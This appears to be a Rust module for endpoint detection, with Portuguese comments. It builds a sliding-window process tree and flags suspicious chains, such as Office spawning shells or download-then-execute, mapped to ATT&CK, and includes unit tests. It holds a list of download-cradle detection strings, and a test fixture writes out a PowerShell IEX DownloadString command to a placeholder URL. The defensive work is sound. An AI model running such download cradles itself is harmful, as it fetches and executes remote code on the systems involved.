//! Árvore de processos em memória + correlação de cadeias suspeitas.
//!
//! Mantém os processos vistos nos últimos N segundos (janela padrão 5 min,
//! configurável) e detecta cadeias pai→filho que, isoladamente, não
//! disparam nenhuma heurística — mas juntas indicam um incidente.
//!
//! Uso típico (Fase 2, no `collector.rs`):
//!
//! ```ignore
//! for fact in snapshot.processes {
//!     let report = heuristics::analyze(&fact);
//!     lineage.observe(&fact, report);
//! }
//! lineage.prune(Instant::now());
//! for fact in snapshot.processes {
//!     let chain = lineage.find_chain(fact.pid);
//!     if !chain.chain_findings.is_empty() {
//!         // publicar alerta
//!     }
//! }
//! ```
//!
//! Estado mutável, não thread-safe — quem usa serializa (single-thread
//! de polling, ou `Mutex`). Sem I/O.

use std::collections::{HashMap, HashSet};
use std::time::{Duration, Instant};

use serde::Serialize;

use super::heuristics::strip_ext;
use super::mitre::{self, Technique};
use super::types::{Finding, MAX_SCORE, ProcessFacts, Severity, SuspicionReport};

/// Janela deslizante padrão (5 min).
pub const DEFAULT_WINDOW_SECONDS: u64 = 300;

/// Cap duro de nós em memória (proteção anti-DoS).
pub const DEFAULT_MAX_NODES: usize = 4096;

/// Nome canônico (sem extensão, minúsculo) que conta como "shell".
const SHELL_NAMES: &[&str] = &[
    "cmd",
    "powershell",
    "pwsh",
    "bash",
    "sh",
    "zsh",
    "wscript",
    "cscript",
    "mshta",
];

/// Suíte Office — a origem clássica de macro maliciosa.
const OFFICE_NAMES: &[&str] = &["winword", "excel", "powerpnt", "outlook", "msaccess"];

// ---------------------------------------------------------------------------
// Tipos públicos
// ---------------------------------------------------------------------------

/// Um processo na árvore.
#[derive(Debug, Clone)]
pub struct ProcessNode {
    pub pid: u32,
    pub parent_pid: Option<u32>,
    pub name: String,
    pub exe_path: Option<String>,
    pub cmdline: String,
    pub user: Option<String>,
    pub first_seen: Instant,
    pub last_seen: Instant,
    pub score: u8,
    pub severity: Severity,
    pub findings: Vec<Finding>,
}

/// Categoria de regra de correlação (cadeia, não processo isolado).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ChainFindingKind {
    /// Pai spawnou ≥3 shells em ≤10s.
    MultiShellSpawn,
    /// Cadeia contém Office → shell (macro / exploit).
    OfficeToC2,
    /// Processo baixou (curl/IEX/…) e tem filho executado de /tmp ou Downloads.
    DownloadAndExecute,
    /// Cadeia com ≥4 níveis em ≤5s (dropper).
    RapidChain,
    /// Processo com score alto cujo pai sumiu (injeção / parent spoofing).
    OrphanHighScore,
}

impl ChainFindingKind {
    /// Peso somado ao `aggregate_score` da cadeia quando dispara.
    pub fn weight(self) -> u8 {
        match self {
            ChainFindingKind::OfficeToC2 => 40,
            ChainFindingKind::DownloadAndExecute => 35,
            ChainFindingKind::RapidChain => 30,
            ChainFindingKind::OrphanHighScore => 30,
            ChainFindingKind::MultiShellSpawn => 25,
        }
    }

    /// Técnica ATT&CK padrão desta regra.
    pub fn default_technique(self) -> Option<Technique> {
        match self {
            ChainFindingKind::MultiShellSpawn => Some(mitre::COMMAND_AND_SCRIPTING),
            ChainFindingKind::OfficeToC2 => Some(mitre::USER_EXECUTION),
            ChainFindingKind::DownloadAndExecute => Some(mitre::INGRESS_TOOL_TRANSFER),
            ChainFindingKind::RapidChain => Some(mitre::COMMAND_AND_SCRIPTING),
            ChainFindingKind::OrphanHighScore => Some(mitre::MASQUERADING),
        }
    }
}

/// Uma finding de correlação (cadeia, não processo).
#[derive(Debug, Clone, Serialize)]
pub struct ChainFinding {
    pub kind: ChainFindingKind,
    pub weight: u8,
    pub detail: String,
    pub technique: Option<Technique>,
}

impl ChainFinding {
    pub fn new(kind: ChainFindingKind, detail: impl Into<String>) -> Self {
        Self {
            kind,
            weight: kind.weight(),
            detail: detail.into(),
            technique: kind.default_technique(),
        }
    }
}

/// Cadeia resultante de [`Lineage::find_chain`].
#[derive(Debug, Clone)]
pub struct ProcessChain {
    /// Ordem: raiz → processo consultado.
    pub nodes: Vec<ProcessNode>,
    /// Score agregado (último processo + bônus das chain findings, cap 100).
    pub aggregate_score: u8,
    /// Findings de correlação que dispararam.
    pub chain_findings: Vec<ChainFinding>,
    /// `true` se o topo da cadeia tem `parent_pid` que não está na árvore.
    pub has_orphan_root: bool,
}

impl ProcessChain {
    pub fn empty() -> Self {
        Self {
            nodes: Vec::new(),
            aggregate_score: 0,
            chain_findings: Vec::new(),
            has_orphan_root: false,
        }
    }

    pub fn is_empty(&self) -> bool {
        self.nodes.is_empty()
    }

    pub fn depth(&self) -> usize {
        self.nodes.len()
    }
}

// ---------------------------------------------------------------------------
// Lineage
// ---------------------------------------------------------------------------

/// Árvore de processos com janela deslizante.
pub struct Lineage {
    nodes: HashMap<u32, ProcessNode>,
    /// pid pai → conjunto de pids filhos (mantido incrementalmente).
    children: HashMap<u32, HashSet<u32>>,
    window: Duration,
    max_nodes: usize,
}

impl Lineage {
    /// Cria com janela e cap de nós explícitos.
    pub fn new(window: Duration, max_nodes: usize) -> Self {
        Self {
            nodes: HashMap::new(),
            children: HashMap::new(),
            window,
            max_nodes,
        }
    }

    /// Cria com defaults (`DEFAULT_WINDOW_SECONDS` / `DEFAULT_MAX_NODES`).
    pub fn with_defaults() -> Self {
        Self::new(
            Duration::from_secs(DEFAULT_WINDOW_SECONDS),
            DEFAULT_MAX_NODES,
        )
    }

    pub fn len(&self) -> usize {
        self.nodes.len()
    }

    pub fn is_empty(&self) -> bool {
        self.nodes.is_empty()
    }

    /// Nº de filhos diretos de `pid` que estão atualmente na árvore.
    pub fn child_count(&self, pid: u32) -> usize {
        self.children.get(&pid).map_or(0, HashSet::len)
    }

    /// Registra/atualiza um processo. Usa `Instant::now()`.
    pub fn observe(&mut self, facts: &ProcessFacts<'_>, report: SuspicionReport) {
        self.observe_at(facts, report, Instant::now());
    }

    /// Como [`observe`], mas com timestamp explícito (testável).
    pub fn observe_at(&mut self, facts: &ProcessFacts<'_>, report: SuspicionReport, now: Instant) {
        // Preserva first_seen se já existe; remove link antigo se o pai mudou.
        let first_seen = match self.nodes.get(&facts.pid) {
            Some(existing) => {
                if existing.parent_pid != facts.parent_pid
                    && let Some(old_ppid) = existing.parent_pid
                    && let Some(set) = self.children.get_mut(&old_ppid)
                {
                    set.remove(&facts.pid);
                }
                existing.first_seen
            }
            None => now,
        };

        let node = ProcessNode {
            pid: facts.pid,
            parent_pid: facts.parent_pid,
            name: facts.name.to_string(),
            exe_path: facts.exe_path.map(str::to_string),
            cmdline: facts.cmdline.to_string(),
            user: facts.user.map(str::to_string),
            first_seen,
            last_seen: now,
            score: report.score,
            severity: report.severity,
            findings: report.findings,
        };
        self.nodes.insert(facts.pid, node);

        if let Some(ppid) = facts.parent_pid {
            self.children.entry(ppid).or_default().insert(facts.pid);
        }

        // Aplica o cap imediatamente para não estourar memória entre prunes.
        if self.nodes.len() > self.max_nodes {
            self.prune(now);
        }
    }

    /// Remove nós fora da janela e impõe `max_nodes` (descarta os mais
    /// antigos por `last_seen`). Reconstrói o índice de filhos do zero.
    pub fn prune(&mut self, now: Instant) {
        let cutoff = now.checked_sub(self.window).unwrap_or(now);

        // 1. Janela
        self.nodes.retain(|_, n| n.last_seen >= cutoff);

        // 2. Cap
        if self.nodes.len() > self.max_nodes {
            let mut by_age: Vec<(u32, Instant)> = self
                .nodes
                .iter()
                .map(|(&pid, n)| (pid, n.last_seen))
                .collect();
            by_age.sort_by_key(|(_, t)| *t);
            let to_drop = self.nodes.len() - self.max_nodes;
            for (pid, _) in by_age.into_iter().take(to_drop) {
                self.nodes.remove(&pid);
            }
        }

        // 3. Reconstrói índice (barato para n <= max_nodes).
        self.children.clear();
        for (&pid, node) in &self.nodes {
            if let Some(ppid) = node.parent_pid {
                self.children.entry(ppid).or_default().insert(pid);
            }
        }
    }

    /// Sobe a árvore a partir de `pid` e devolve a cadeia raiz→pid,
    /// com score agregado e findings de correlação.
    pub fn find_chain(&self, pid: u32) -> ProcessChain {
        let mut nodes = Vec::new();
        let mut visited = HashSet::new();
        let mut current = Some(pid);

        while let Some(p) = current {
            if !visited.insert(p) {
                break; // guarda contra ciclo
            }
            let Some(node) = self.nodes.get(&p) else {
                break;
            };
            nodes.push(node.clone());
            current = node.parent_pid;
        }

        if nodes.is_empty() {
            return ProcessChain::empty();
        }

        nodes.reverse();

        let has_orphan_root = match nodes.first().and_then(|n| n.parent_pid) {
            Some(ppid) => !self.nodes.contains_key(&ppid),
            None => false,
        };

        let chain_findings = self.run_rules(&nodes);
        let aggregate_score = compute_aggregate(&nodes, &chain_findings);

        ProcessChain {
            nodes,
            aggregate_score,
            chain_findings,
            has_orphan_root,
        }
    }

    // -----------------------------------------------------------------------
    // Regras de correlação
    // -----------------------------------------------------------------------

    fn run_rules(&self, chain: &[ProcessNode]) -> Vec<ChainFinding> {
        let mut out = Vec::new();
        if let Some(f) = self.rule_multi_shell_spawn(chain) {
            out.push(f);
        }
        if let Some(f) = self.rule_office_to_c2(chain) {
            out.push(f);
        }
        if let Some(f) = self.rule_download_and_execute(chain) {
            out.push(f);
        }
        if let Some(f) = self.rule_rapid_chain(chain) {
            out.push(f);
        }
        if let Some(f) = self.rule_orphan_high_score(chain) {
            out.push(f);
        }
        out
    }

    /// Pai com ≥3 shells filhos em ≤10s.
    fn rule_multi_shell_spawn(&self, chain: &[ProcessNode]) -> Option<ChainFinding> {
        for node in chain {
            let Some(child_pids) = self.children.get(&node.pid) else {
                continue;
            };
            let mut shells: Vec<&ProcessNode> = child_pids
                .iter()
                .filter_map(|pid| self.nodes.get(pid))
                .filter(|c| is_shell(&c.name))
                .collect();
            if shells.len() < 3 {
                continue;
            }
            shells.sort_by_key(|c| c.first_seen);
            for window in shells.windows(3) {
                let span = window[2]
                    .first_seen
                    .saturating_duration_since(window[0].first_seen);
                if span <= Duration::from_secs(10) {
                    let names: Vec<&str> = window.iter().map(|c| c.name.as_str()).collect();
                    return Some(ChainFinding::new(
                        ChainFindingKind::MultiShellSpawn,
                        format!(
                            "{} spawnou {} shells em <=10s: {}",
                            node.name,
                            window.len(),
                            names.join(", ")
                        ),
                    ));
                }
            }
        }
        None
    }

    /// Cadeia contém transição Office → shell.
    fn rule_office_to_c2(&self, chain: &[ProcessNode]) -> Option<ChainFinding> {
        for pair in chain.windows(2) {
            let parent = &pair[0];
            let child = &pair[1];
            if is_office(&parent.name) && is_shell(&child.name) {
                return Some(ChainFinding::new(
                    ChainFindingKind::OfficeToC2,
                    format!("{} spawnou {}", parent.name, child.name),
                ));
            }
        }
        None
    }

    /// Processo com download-cradle cujo filho executa de pasta temporária.
    fn rule_download_and_execute(&self, chain: &[ProcessNode]) -> Option<ChainFinding> {
        for node in chain {
            if !has_download_cradle(&node.cmdline) {
                continue;
            }
            let Some(child_pids) = self.children.get(&node.pid) else {
                continue;
            };
            for cpid in child_pids {
                let Some(child) = self.nodes.get(cpid) else {
                    continue;
                };
                if let Some(path) = &child.exe_path
                    && is_temp_or_user_dir(path)
                {
                    return Some(ChainFinding::new(
                        ChainFindingKind::DownloadAndExecute,
                        format!("{} baixou e executou {}", node.name, child.name),
                    ));
                }
            }
        }
        None
    }

    /// Cadeia de ≥4 níveis em ≤5s.
    fn rule_rapid_chain(&self, chain: &[ProcessNode]) -> Option<ChainFinding> {
        if chain.len() < 4 {
            return None;
        }
        let earliest = chain.iter().map(|n| n.first_seen).min()?;
        let latest = chain.iter().map(|n| n.first_seen).max()?;
        if latest.saturating_duration_since(earliest) <= Duration::from_secs(5) {
            return Some(ChainFinding::new(
                ChainFindingKind::RapidChain,
                format!("cadeia de {} processos em <=5s", chain.len()),
            ));
        }
        None
    }

    /// Último processo com score ≥50 cujo pai não está na árvore.
    fn rule_orphan_high_score(&self, chain: &[ProcessNode]) -> Option<ChainFinding> {
        let last = chain.last()?;
        if last.score < 50 {
            return None;
        }
        let ppid = last.parent_pid?;
        if self.nodes.contains_key(&ppid) {
            return None;
        }
        Some(ChainFinding::new(
            ChainFindingKind::OrphanHighScore,
            format!(
                "{} (score {}) tem pai PID {} fora da árvore — possível injeção ou parent spoofing",
                last.name, last.score, ppid
            ),
        ))
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn is_shell(name: &str) -> bool {
    let stem = strip_ext(name).to_ascii_lowercase();
    SHELL_NAMES.iter().any(|s| stem == *s)
}

fn is_office(name: &str) -> bool {
    let stem = strip_ext(name).to_ascii_lowercase();
    OFFICE_NAMES.iter().any(|s| stem == *s)
}

fn has_download_cradle(cmdline: &str) -> bool {
    let lc = cmdline.to_ascii_lowercase();
    lc.contains("downloadstring(")
        || lc.contains("downloadfile(")
        || lc.contains("invoke-webrequest")
        || lc.contains("curl ")
        || lc.contains("wget ")
        || lc.contains("certutil -urlcache")
        || lc.contains("bitsadmin")
}

fn is_temp_or_user_dir(path: &str) -> bool {
    let norm = path.replace('\\', "/").to_ascii_lowercase();
    norm.contains("/tmp/")
        || norm.contains("/appdata/local/temp/")
        || norm.contains("/downloads/")
        || norm.contains("/dev/shm/")
        || norm.contains("/var/tmp/")
}

fn compute_aggregate(nodes: &[ProcessNode], findings: &[ChainFinding]) -> u8 {
    let base = nodes.last().map_or(0u32, |n| n.score as u32);
    let bonus: u32 = findings.iter().map(|f| f.weight as u32).sum();
    (base + bonus).min(MAX_SCORE as u32) as u8
}

// ---------------------------------------------------------------------------
// Testes
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::security::heuristics::analyze;
    use crate::security::types::ProcessFacts;

    fn facts<'a>(
        pid: u32,
        parent: Option<u32>,
        name: &'a str,
        cmd: &'a str,
        exe: Option<&'a str>,
    ) -> ProcessFacts<'a> {
        ProcessFacts {
            pid,
            parent_pid: parent,
            name,
            exe_path: exe,
            cmdline: cmd,
            parent_name: None,
            user: None,
            cpu_sustained_high: false,
        }
    }

    fn observe(l: &mut Lineage, f: &ProcessFacts<'_>, at: Instant) {
        let report = analyze(f);
        l.observe_at(f, report, at);
    }

    #[test]
    fn single_node_chain() {
        let mut l = Lineage::with_defaults();
        let now = Instant::now();
        let f = facts(
            1,
            None,
            "explorer.exe",
            "",
            Some(r"C:\Windows\explorer.exe"),
        );
        observe(&mut l, &f, now);

        let chain = l.find_chain(1);
        assert_eq!(chain.depth(), 1);
        assert_eq!(chain.nodes[0].name, "explorer.exe");
        assert!(!chain.has_orphan_root);
        assert!(chain.chain_findings.is_empty());
    }

    #[test]
    fn unknown_pid_returns_empty_chain() {
        let l = Lineage::with_defaults();
        let chain = l.find_chain(9999);
        assert!(chain.is_empty());
        assert_eq!(chain.aggregate_score, 0);
    }

    #[test]
    fn parent_child_chain_ordered_root_to_leaf() {
        let mut l = Lineage::with_defaults();
        let t0 = Instant::now();
        let parent = facts(1, None, "explorer.exe", "", None);
        let child = facts(2, Some(1), "notepad.exe", "", None);
        observe(&mut l, &parent, t0);
        observe(&mut l, &child, t0 + Duration::from_millis(100));

        let chain = l.find_chain(2);
        assert_eq!(chain.depth(), 2);
        assert_eq!(chain.nodes[0].pid, 1);
        assert_eq!(chain.nodes[1].pid, 2);
    }

    #[test]
    fn office_to_c2_rule_fires() {
        let mut l = Lineage::with_defaults();
        let t0 = Instant::now();
        let office = facts(10, None, "winword.exe", "", None);
        let cmd = facts(11, Some(10), "cmd.exe", "", None);
        let ps = facts(12, Some(11), "powershell.exe", "powershell -enc AAA", None);
        observe(&mut l, &office, t0);
        observe(&mut l, &cmd, t0 + Duration::from_millis(500));
        observe(&mut l, &ps, t0 + Duration::from_secs(1));

        let chain = l.find_chain(12);
        assert!(
            chain
                .chain_findings
                .iter()
                .any(|f| f.kind == ChainFindingKind::OfficeToC2)
        );
        assert!(chain.aggregate_score > 0);
    }

    #[test]
    fn multi_shell_spawn_rule_fires() {
        let mut l = Lineage::with_defaults();
        let t0 = Instant::now();
        let parent = facts(20, None, "services.exe", "", None);
        observe(&mut l, &parent, t0);
        for (i, secs) in [1u64, 3, 5].iter().enumerate() {
            let shell = facts(21 + i as u32, Some(20), "cmd.exe", "", None);
            observe(&mut l, &shell, t0 + Duration::from_secs(*secs));
        }

        let chain = l.find_chain(20);
        assert!(
            chain
                .chain_findings
                .iter()
                .any(|f| f.kind == ChainFindingKind::MultiShellSpawn)
        );
    }

    #[test]
    fn rapid_chain_rule_fires() {
        let mut l = Lineage::with_defaults();
        let t0 = Instant::now();
        for (pid, ppid, offset_ms) in [
            (1u32, None, 0u64),
            (2, Some(1), 500),
            (3, Some(2), 1000),
            (4, Some(3), 2000),
        ] {
            let f = facts(pid, ppid, "proc.exe", "", None);
            observe(&mut l, &f, t0 + Duration::from_millis(offset_ms));
        }

        let chain = l.find_chain(4);
        assert_eq!(chain.depth(), 4);
        assert!(
            chain
                .chain_findings
                .iter()
                .any(|f| f.kind == ChainFindingKind::RapidChain)
        );
    }

    #[test]
    fn download_and_execute_rule_fires() {
        let mut l = Lineage::with_defaults();
        let t0 = Instant::now();
        let downloader = facts(
            30,
            None,
            "powershell.exe",
            "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"",
            None,
        );
        let dropped = facts(
            31,
            Some(30),
            "evil.exe",
            "",
            Some(r"C:\Users\u\AppData\Local\Temp\evil.exe"),
        );
        observe(&mut l, &downloader, t0);
        observe(&mut l, &dropped, t0 + Duration::from_secs(1));

        let chain = l.find_chain(31);
        assert!(
            chain
                .chain_findings
                .iter()
                .any(|f| f.kind == ChainFindingKind::DownloadAndExecute)
        );
    }

    #[test]
    fn orphan_high_score_rule_fires() {
        let mut l = Lineage::with_defaults();
        let t0 = Instant::now();
        // scvhost -> typosquatting (+40), em Downloads (+15), com -enc (+30) = 85
        let f = facts(
            40,
            Some(9999), // pai que nunca foi observado
            "scvhost.exe",
            "powershell -enc AAA",
            Some(r"C:\Users\u\Downloads\scvhost.exe"),
        );
        observe(&mut l, &f, t0);

        let chain = l.find_chain(40);
        assert!(chain.has_orphan_root);
        assert!(
            chain
                .chain_findings
                .iter()
                .any(|f| f.kind == ChainFindingKind::OrphanHighScore)
        );
    }

    #[test]
    fn prune_removes_old_nodes() {
        let mut l = Lineage::new(Duration::from_secs(60), 1024);
        let t0 = Instant::now();
        let f = facts(50, None, "proc.exe", "", None);
        observe(&mut l, &f, t0);
        assert_eq!(l.len(), 1);

        l.prune(t0 + Duration::from_secs(120));
        assert_eq!(l.len(), 0);
    }

    #[test]
    fn max_nodes_cap_enforced() {
        let mut l = Lineage::new(Duration::from_secs(3600), 3);
        let t0 = Instant::now();
        for i in 0..5u32 {
            let f = facts(i, None, "proc.exe", "", None);
            observe(&mut l, &f, t0 + Duration::from_millis(u64::from(i) * 100));
        }
        assert!(l.len() <= 3);
        // Os mais recentes devem sobreviver.
        assert!(l.nodes.contains_key(&4));
    }

    #[test]
    fn observe_same_pid_updates_last_seen_keeps_first_seen() {
        let mut l = Lineage::with_defaults();
        let t0 = Instant::now();
        let f = facts(60, None, "proc.exe", "", None);
        observe(&mut l, &f, t0);
        observe(&mut l, &f, t0 + Duration::from_secs(1));

        assert_eq!(l.len(), 1);
        let chain = l.find_chain(60);
        assert_eq!(chain.nodes[0].first_seen, t0);
        assert_eq!(chain.nodes[0].last_seen, t0 + Duration::from_secs(1));
    }

    #[test]
    fn cycle_does_not_loop_forever() {
        let mut l = Lineage::with_defaults();
        let t0 = Instant::now();
        // 1 → 2 e 2 → 1 (impossível na prática, mas testável)
        let a = facts(1, Some(2), "a.exe", "", None);
        let b = facts(2, Some(1), "b.exe", "", None);
        observe(&mut l, &a, t0);
        observe(&mut l, &b, t0 + Duration::from_millis(10));

        let chain = l.find_chain(1);
        assert!(chain.depth() <= 2);
    }
}
